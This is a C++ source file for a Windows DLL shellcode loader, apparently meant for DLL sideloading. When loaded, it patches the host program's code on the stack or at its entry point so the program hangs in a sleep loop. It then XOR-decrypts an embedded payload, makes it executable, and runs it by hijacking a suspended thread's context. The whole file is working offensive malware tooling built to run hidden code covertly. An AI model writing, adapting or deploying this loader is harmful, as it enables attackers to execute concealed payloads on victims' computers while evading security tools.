#include <Windows.h>
#include <winternl.h>
#include <intrin.h>
#include <string>
#include <TlHelp32.h>
#include <psapi.h>
#include "header.h"

using fnNtTestAlert = NTSTATUS(NTAPI*)();

void DoNothing() {
	while (true) Sleep(10 * 1000);
}

void Dummy() {
	Sleep(0);
}

void InstallHook(PVOID address, PVOID jump) {
	BYTE Jump[12] = { 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };

	DWORD old;
	VirtualProtect(address, sizeof(Jump), 0x40, &old);

	RtlCopyMemory(address, Jump, 12);
	RtlCopyMemory(((PBYTE)address + 2), &jump, 8);

	VirtualProtect(address, sizeof(Jump), old, &old);
}

BOOL HookTheStack() {

	// Get primary module info
	PBYTE baseAddress = NULL;
	DWORD baseSize = 0;

	WCHAR fileName[MAX_PATH];
	GetProcessImageFileName((HANDLE)-1, fileName, MAX_PATH);
	std::wstring pathString = std::wstring(fileName);

	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, GetCurrentProcessId());

	MODULEENTRY32 pEntry;
	pEntry.dwSize = sizeof(pEntry);
	BOOL hRes = Module32Next(hSnapShot, &pEntry);
	while (hRes)
	{
		if (pathString.find(pEntry.szModule) != std::wstring::npos) {
			baseAddress = pEntry.modBaseAddr;
			baseSize = pEntry.modBaseSize;
			break;
		}
		hRes = Module32Next(hSnapShot, &pEntry);
	}
	CloseHandle(hSnapShot);

	if (!baseAddress || !baseSize)
		return FALSE;

	// Hunt the stack

	PBYTE ldrLoadDll = (PBYTE)GetProcAddress(GetModuleHandle(L"ntdll"), "LdrLoadDll");
	PBYTE* stack = (PBYTE*)_AddressOfReturnAddress();
	BOOL foundLoadDll = FALSE;

	ULONG_PTR lowLimit, highLimit;
	GetCurrentThreadStackLimits(&lowLimit, &highLimit);

	for (; (ULONG_PTR)stack < highLimit; stack++) {
		if (*stack < (PBYTE)0x1000)
			continue;

		if (*stack > ldrLoadDll && *stack < ldrLoadDll + 0x1000) {
			// LdrLoadDll is in the stack, let's start looking for our module
			foundLoadDll = TRUE;
		}

		if (foundLoadDll && *stack > baseAddress && *stack < (baseAddress + baseSize)) {
			MEMORY_BASIC_INFORMATION mInfo = { 0 };
			VirtualQuery(*stack, &mInfo, sizeof(mInfo));

			if (!(mInfo.Protect & PAGE_EXECUTE_READ))
				continue;

			// Primary module is in the stack, let's hook there
			InstallHook(*stack, DoNothing);

			return TRUE;
		}
	}

	// No references found, let's just hook the entry point

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)baseAddress;
	PIMAGE_NT_HEADERS32 ntHeader = (PIMAGE_NT_HEADERS32)(baseAddress + dosHeader->e_lfanew);
	PBYTE entryPoint = baseAddress + ntHeader->OptionalHeader.AddressOfEntryPoint;

	InstallHook(entryPoint, &DoNothing);

	return TRUE;
}

void decrypt(char* data, size_t data_len, char* key, size_t key_len) {
	int j;
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;
		Sleep(0);
		data[i] = data[i] ^ key[j];
		j++;
	}
}

BOOL main() {

	fnNtTestAlert pNtTestAlert = (fnNtTestAlert)(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtTestAlert"));

	// Allocate memory
	PVOID payloadAddress = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (payloadAddress == NULL) {
		return -1;
	}

	// Decrypt
	decrypt((char*)buf, sizeof(buf), key, sizeof(key));

	// Copy memory
	memcpy(payloadAddress, buf, sizeof(buf));

	// Change protection
	DWORD oldProt = 0;
	BOOL success;
	success = VirtualProtect(payloadAddress, sizeof(buf), PAGE_EXECUTE_READ, &oldProt);
	if (!success) {
		return -1;
	}

	// Local thread hijacking
	HANDLE hThread = NULL;
	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)&Dummy, NULL, CREATE_SUSPENDED, NULL);
	if (hThread == NULL) {
		return -1;
	}

	LPCONTEXT pContext = new CONTEXT();
	pContext->ContextFlags = CONTEXT_INTEGER;

	if (!GetThreadContext(hThread, pContext)) {
		return -1;
	}
	pContext->Rcx = (DWORD64)payloadAddress;

	if (!SetThreadContext(hThread, pContext)) {
		return -1;
	}

	ResumeThread(hThread);
	WaitForSingleObject(hThread, 1000);

	return 0;

}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
	if (ul_reason_for_call != DLL_PROCESS_ATTACH)
		return TRUE;

	if (!HookTheStack())
		return TRUE;

	main();

	return TRUE;
}

